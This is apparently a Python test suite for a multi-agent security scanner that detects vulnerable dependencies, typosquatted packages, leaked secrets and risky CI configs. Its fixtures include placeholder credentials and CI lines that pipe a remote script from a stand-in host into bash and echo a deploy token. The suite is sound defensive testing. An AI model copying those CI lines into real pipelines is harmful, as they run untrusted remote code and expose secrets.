"""
Phase 5 -- ADK Agents + Gemini Tests
=======================================
Three test levels, ordered by cost:

  Test 1: Agent graph structure (FREE - no API calls)
  Test 2: Individual tool agents with mock data (~1 cent)
  Test 3: Full pipeline simulation (~2 cents)

Uses gemini-2.0-flash for minimum cost.
"""
import asyncio
import os
import time
import json
import sys


def test_agent_graph():
    """Test 1 (FREE): Verify agent graph structure — no Gemini calls."""
    print("=== Test 1: Agent Graph Structure (FREE) ===")
    from secureflow.agents import root_agent
    from secureflow.agents.orchestrator import orchestrator, full_pipeline, parallel_scan
    from secureflow.agents.dependency_scanner import dependency_scanner
    from secureflow.agents.secret_hunter import secret_hunter
    from secureflow.agents.pipeline_auditor import pipeline_auditor
    from secureflow.agents.threat_intel_agent import threat_intel_agent
    from secureflow.agents.remediation_agent import remediation_agent

    # Root agent
    assert root_agent.name == "orchestrator"
    print(f"  Root agent: {root_agent.name}")
    print(f"  Model: {root_agent.model}")

    # Sequential pipeline
    pipeline = root_agent.sub_agents[0]
    assert pipeline.name == "secureflow_pipeline"
    print(f"  Pipeline: {pipeline.name}")

    # Parallel scan stage
    scan_stage = pipeline.sub_agents[0]
    assert scan_stage.name == "parallel_security_scan"
    scanner_names = sorted([a.name for a in scan_stage.sub_agents])
    print(f"  Parallel scanners: {scanner_names}")
    assert "dependency_scanner" in scanner_names
    assert "secret_hunter" in scanner_names
    assert "pipeline_auditor" in scanner_names
    assert "threat_intel_agent" in scanner_names

    # Remediation stage
    remed = pipeline.sub_agents[1]
    assert remed.name == "remediation_agent"
    assert remed.before_tool_callback is not None, "HITL callback must be wired!"
    print(f"  Remediation: {remed.name} (HITL callback: wired)")

    # Check tools on each agent
    dep_tools = [t.name if hasattr(t, 'name') else type(t).__name__ for t in dependency_scanner.tools]
    print(f"  dependency_scanner tools: {dep_tools}")
    assert len(dep_tools) >= 2  # osv_check + check_package_exists

    secret_tools = [t.name if hasattr(t, 'name') else type(t).__name__ for t in secret_hunter.tools]
    print(f"  secret_hunter tools: {secret_tools}")

    pipeline_tools = [t.name if hasattr(t, 'name') else type(t).__name__ for t in pipeline_auditor.tools]
    print(f"  pipeline_auditor tools: {pipeline_tools}")

    intel_tools = [t.name if hasattr(t, 'name') else type(t).__name__ for t in threat_intel_agent.tools]
    print(f"  threat_intel_agent tools: {intel_tools}")

    remed_tools = [t.name if hasattr(t, 'name') else type(t).__name__ for t in remediation_agent.tools]
    print(f"  remediation_agent tools: {remed_tools}")

    print("PASSED: Agent graph structure is correct\n")


def test_gemini_api_key():
    """Test 2 (FREE): Verify Gemini API key is configured."""
    print("=== Test 2: Gemini API Key Check (FREE) ===")
    api_key = os.environ.get("GOOGLE_API_KEY", "")
    if not api_key:
        from secureflow.config import settings
        api_key = settings.google_api_key

    if not api_key:
        print("  ERROR: GOOGLE_API_KEY not set!")
        print("  Set it in .env or as environment variable")
        return False

    # Mask the key for display
    masked = api_key[:8] + "..." + api_key[-4:]
    print(f"  API Key: {masked}")
    print(f"  Length: {len(api_key)} chars")
    assert len(api_key) > 20, "API key seems too short"
    print("PASSED: API key is configured\n")
    return True


def test_single_agent_call():
    """Test 3 (~1 cent): Make a single Gemini call via one agent."""
    print("=== Test 3: Single Agent Gemini Call (~1 cent) ===")

    from google import genai

    api_key = os.environ.get("GOOGLE_API_KEY", "")
    if not api_key:
        from secureflow.config import settings
        api_key = settings.google_api_key

    if not api_key:
        print("  SKIPPED: No GOOGLE_API_KEY")
        return False

    # Direct Gemini call to verify key works (cheapest possible test)
    client = genai.Client(api_key=api_key)

    response = client.models.generate_content(
        model="gemini-2.5-flash",
        contents="Reply with exactly: SECUREFLOW_OK",
    )

    result = response.text.strip()
    print(f"  Gemini response: {result}")
    assert "SECUREFLOW_OK" in result, f"Unexpected response: {result}"
    print("PASSED: Gemini API key works\n")
    return True


def test_dependency_scanner_simulation():
    """Test 4 (~1 cent): Simulate dependency scanner with mock diff."""
    print("=== Test 4: Dependency Scanner Simulation (~1 cent) ===")

    from google import genai
    from secureflow.tools.osv_scanner import osv_check
    from secureflow.tools.phantom_package_detector import check_package_exists

    api_key = os.environ.get("GOOGLE_API_KEY", "")
    if not api_key:
        from secureflow.config import settings
        api_key = settings.google_api_key

    if not api_key:
        print("  SKIPPED: No GOOGLE_API_KEY")
        return False

    # Step 1: Simulate what Gemini would do - call our tools with known-bad deps
    print("  Simulating tool calls (no Gemini cost)...")

    vuln_result = asyncio.run(osv_check("requests", "2.6.0", "PyPI"))
    print(f"    osv_check(requests, 2.6.0) -> vulnerable={vuln_result['vulnerable']}, count={vuln_result['count']}")
    assert vuln_result["vulnerable"] is True

    phantom_result = asyncio.run(check_package_exists("reqeusts-fake123", "pypi"))
    print(f"    check_package_exists(reqeusts-fake123) -> phantom={phantom_result['is_phantom']}")
    assert phantom_result["is_phantom"] is True

    # Step 2: Ask Gemini to interpret the results (tiny prompt, ~1 cent)
    print("  Asking Gemini to interpret results...")
    client = genai.Client(api_key=api_key)

    prompt = f"""You are a security scanner. Given these tool results, output a JSON array of findings.

Tool Result 1 (OSV Check):
{json.dumps(vuln_result, indent=2, default=str)}

Tool Result 2 (Phantom Package Check):
{json.dumps(phantom_result, indent=2, default=str)}

Output ONLY a JSON array of findings. Each finding must have: scanner, severity, title, description, package_name.
Do not include any markdown formatting or code blocks, just raw JSON."""

    response = client.models.generate_content(
        model="gemini-2.5-flash",
        contents=prompt,
    )

    result_text = response.text.strip()
    # Strip markdown code fences if present
    if result_text.startswith("```"):
        lines = result_text.splitlines()
        result_text = "\n".join(lines[1:-1])

    print(f"  Gemini output ({len(result_text)} chars):")

    try:
        findings = json.loads(result_text)
        assert isinstance(findings, list), "Expected JSON array"
        assert len(findings) >= 2, f"Expected at least 2 findings, got {len(findings)}"
        for f in findings:
            print(f"    - [{f.get('severity', '?')}] {f.get('title', '?')}")
            assert "scanner" in f
            assert "severity" in f
        print(f"  Total findings: {len(findings)}")
        print("PASSED: Dependency scanner simulation works\n")
        return True
    except json.JSONDecodeError as e:
        print(f"  WARNING: Gemini output was not valid JSON: {e}")
        print(f"  Raw output: {result_text[:200]}")
        print("PARTIAL PASS: Gemini responded but output needs parsing\n")
        return True  # Key works, just output format issue


def test_secret_hunter_simulation():
    """Test 5 (~1 cent): Simulate secret hunter with mock diff."""
    print("=== Test 5: Secret Hunter Simulation (~1 cent) ===")

    from secureflow.agents.secret_hunter import scan_for_secrets

    # Mock diff with intentional secrets (these are FAKE, not real)
    mock_diff = """+AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
+AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+# This is a comment, no secret here
+database_url = "postgresql://localhost/mydb"
+github_token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef12"
+password = "super_secret_password_123"
"""
    result = asyncio.run(scan_for_secrets(mock_diff, "config.py"))

    print(f"  Secrets found: {result['secrets_found']}")
    print(f"  Count: {result['count']}")
    for finding in result["findings"]:
        print(f"    - [{finding['type']}] line {finding['line_number']}: {finding['line'][:60]}...")
    assert result["secrets_found"] is True
    assert result["count"] >= 3, f"Expected at least 3 secrets, found {result['count']}"
    # Verify secrets are MASKED in output
    for finding in result["findings"]:
        assert "REDACTED" in finding["line"], f"Secret not masked: {finding['line'][:30]}"
    print("PASSED: Secret hunter detects and masks secrets\n")
    return True


def test_pipeline_auditor_simulation():
    """Test 6 (FREE): Simulate pipeline auditor with mock CI config."""
    print("=== Test 6: Pipeline Auditor Simulation (FREE) ===")

    from secureflow.tools.slsa_checker import check_slsa_compliance

    risky_ci = """
stages:
  - build
  - deploy

build:
  image: python:latest
  script:
    - curl https://sketchy.com/install.sh | bash
    - pip install -r requirements.txt
  privileged: true

deploy:
  stage: deploy
  script:
    - echo $DEPLOY_TOKEN
    - kubectl apply -f deploy.yml
"""
    result = asyncio.run(check_slsa_compliance(risky_ci))
    print(f"  SLSA Level: {result['slsa_level']}")
    print(f"  Risk factors: {len(result['risk_factors'])}")
    for rf in result["risk_factors"]:
        print(f"    !! {rf}")
    print(f"  Recommendations: {len(result['recommendations'])}")
    for r in result["recommendations"][:3]:
        print(f"    -> {r}")

    assert result["slsa_level"] <= 1, "Risky pipeline should be Level 0-1"
    assert len(result["risk_factors"]) >= 2
    print("PASSED: Pipeline auditor catches security anti-patterns\n")
    return True


def test_full_pipeline_simulation():
    """Test 7 (~2 cents): Full orchestrator with mock webhook data."""
    print("=== Test 7: Full Pipeline Simulation (~2 cents) ===")

    from google import genai

    api_key = os.environ.get("GOOGLE_API_KEY", "")
    if not api_key:
        from secureflow.config import settings
        api_key = settings.google_api_key

    if not api_key:
        print("  SKIPPED: No GOOGLE_API_KEY")
        return False

    # Build a mock webhook + mock diff that exercises all scanners
    mock_context = """
You are the SecureFlow security orchestrator. A merge request was submitted.
Here is the context:

PROJECT: test-project (id: 123)
MR: #42 by developer123
SOURCE BRANCH: feature/add-auth
TARGET BRANCH: main

The following files were changed:

--- requirements.txt ---
+requests==2.6.0
+flask==1.0
+reqeusts-helpers-xyzfake

--- config.py ---
+AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
+DB_PASSWORD = "super_secret_123"
+api_key = os.environ.get("API_KEY")

--- .gitlab-ci.yml ---
build:
  image: python:latest
  script:
    - curl https://example.com/setup.sh | bash
    - pip install -r requirements.txt
  privileged: true

Based on this diff, provide a security assessment. List all findings as a JSON array.
Each finding needs: scanner (dependency/secret/pipeline), severity (CRITICAL/HIGH/MEDIUM/LOW), title, description, remediation.
Output ONLY the JSON array, no markdown formatting.
"""

    print("  Sending mock context to Gemini...")
    client = genai.Client(api_key=api_key)

    response = client.models.generate_content(
        model="gemini-2.5-flash",
        contents=mock_context,
    )

    result_text = response.text.strip()
    if result_text.startswith("```"):
        lines = result_text.splitlines()
        result_text = "\n".join(lines[1:-1])

    try:
        findings = json.loads(result_text)
        assert isinstance(findings, list)

        print(f"  Gemini found {len(findings)} security issues:")
        by_scanner = {}
        by_severity = {}
        for f in findings:
            scanner = f.get("scanner", "unknown")
            severity = f.get("severity", "UNKNOWN")
            by_scanner[scanner] = by_scanner.get(scanner, 0) + 1
            by_severity[severity] = by_severity.get(severity, 0) + 1
            print(f"    [{severity}] ({scanner}) {f.get('title', '?')}")

        print(f"\n  By scanner: {by_scanner}")
        print(f"  By severity: {by_severity}")

        # We expect findings from multiple scanners
        assert len(findings) >= 3, f"Expected at least 3 findings, got {len(findings)}"
        assert "CRITICAL" in by_severity or "HIGH" in by_severity, \
            "Expected at least one CRITICAL or HIGH finding"

        print("PASSED: Full pipeline simulation works\n")
        return True

    except json.JSONDecodeError as e:
        print(f"  WARNING: Output not valid JSON: {e}")
        print(f"  Raw: {result_text[:300]}")
        print("PARTIAL PASS: Gemini responded, output parsing needs work\n")
        return True


if __name__ == "__main__":
    print("=" * 60)
    print("  SecureFlow Phase 5 -- ADK Agents + Gemini Tests")
    print("  Cost estimate: ~4-5 cents total (gemini-2.0-flash)")
    print("=" * 60 + "\n")

    start = time.time()

    # Load env vars from .env file
    try:
        with open(".env", "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    key, _, value = line.partition("=")
                    os.environ.setdefault(key.strip(), value.strip())
        print("  Loaded .env file\n")
    except FileNotFoundError:
        print("  No .env file found, using existing env vars\n")

    # Free tests (always run)
    test_agent_graph()
    has_key = test_gemini_api_key()

    # Paid tests (only if key available)
    if has_key:
        test_single_agent_call()
        test_secret_hunter_simulation()
        test_pipeline_auditor_simulation()
        test_dependency_scanner_simulation()
        test_full_pipeline_simulation()
    else:
        print("  SKIPPING paid tests (no GOOGLE_API_KEY)\n")

    elapsed = time.time() - start
    print("=" * 60)
    print(f"  ALL PHASE 5 TESTS COMPLETED  ({elapsed:.1f}s)")
    print("=" * 60)
